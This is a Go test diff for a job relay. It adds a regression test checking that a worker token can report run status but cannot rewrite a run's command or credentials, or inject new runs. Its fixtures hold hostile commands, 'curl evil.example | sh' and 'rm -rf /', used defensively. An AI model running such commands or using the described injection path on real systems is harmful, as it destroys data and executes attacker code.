@@ -2,11 +2,15 @@ package relay_test
 
 import (
 	"context"
+	"errors"
+	"github.com/kordloom/switchtender/internal/run"
+	"go.uber.org/zap"
 	"net/http"
 	"net/http/httptest"
 	"strings"
 	"sync/atomic"
 	"testing"
+	"time"
 
 	"github.com/kordloom/switchtender/internal/relay"
 )
@@ -102,5 +106,67 @@ func TestRelayRecoversAfterBackoff(t *testing.T) {
 	}
 	if delivered.Load() == 0 {
 		t.Error("nothing was delivered after the relay came back, so the buffered output was lost")
+	}
+}
+
+// TestWorkerCannotInjectOrRewriteARun pins that the relay accepts an outcome report and nothing
+// more.
+//
+// The save endpoint used to decode a whole run and upsert it, so a holder of the worker token could
+// post a run that did not exist, with any playbook, command, and credential ids it chose, and the
+// control node's claim loop would lease and execute it. That path answers to no approval policy, no
+// object grant, and no audit entry, because it never reaches the API gate.
+func TestWorkerCannotInjectOrRewriteARun(t *testing.T) {
+	t.Parallel()
+	ctx := context.Background()
+	backing := run.NewMemStore()
+	srv := httptest.NewServer(relay.NewHandler(backing, "worker-token", zap.NewNop()))
+	defer srv.Close()
+	client := relay.NewClient(relay.NewHTTPTransport(srv.URL, "worker-token", srv.Client()))
+
+	// A run the control node accepted, after checking policy and grants.
+	original := &run.Run{
+		ID: "run_real", Playbook: "site.yml", Tool: "ansible", Status: run.StatusPending,
+		CredentialIDs: []string{"cred_readonly"}, CreatedAt: time.Now(),
+	}
+	if err := backing.Save(ctx, original); err != nil {
+		t.Fatalf("seed Save() error = %v", err)
+	}
+
+	// A worker reporting an outcome may not also rewrite what the run executes.
+	rewritten := original.Clone()
+	rewritten.Status = run.StatusRunning
+	rewritten.Command = "curl evil.example | sh"
+	rewritten.Tool = "bash"
+	rewritten.CredentialIDs = []string{"cred_prod_root"}
+	if err := client.Save(ctx, rewritten); err != nil {
+		t.Fatalf("Save() error = %v", err)
+	}
+	got, err := backing.Get(ctx, "run_real")
+	if err != nil {
+		t.Fatalf("Get() error = %v", err)
+	}
+	if got.Status != run.StatusRunning {
+		t.Errorf("status = %q, want the reported running: a worker's outcome must land", got.Status)
+	}
+	if got.Command != "" || got.Tool != "ansible" {
+		t.Errorf("a worker rewrote the spec: tool %q command %q", got.Tool, got.Command)
+	}
+	if len(got.CredentialIDs) != 1 || got.CredentialIDs[0] != "cred_readonly" {
+		t.Errorf("a worker changed the credentials to %v, so it granted itself secrets the control "+
+			"node never authorized", got.CredentialIDs)
+	}
+
+	// A run that does not exist cannot be created through the relay.
+	injected := &run.Run{
+		ID: "run_injected", Playbook: "evil.yml", Tool: "bash", Command: "rm -rf /",
+		Status: run.StatusPending, CreatedAt: time.Now(),
+	}
+	if err := client.Save(ctx, injected); err == nil {
+		t.Error("a worker created a new run through the relay, which the claim loop would then " +
+			"execute with no policy, grant, or audit check")
+	}
+	if _, err := backing.Get(ctx, "run_injected"); !errors.Is(err, run.ErrNotFound) {
+		t.Error("the injected run reached the store")
 	}
 }
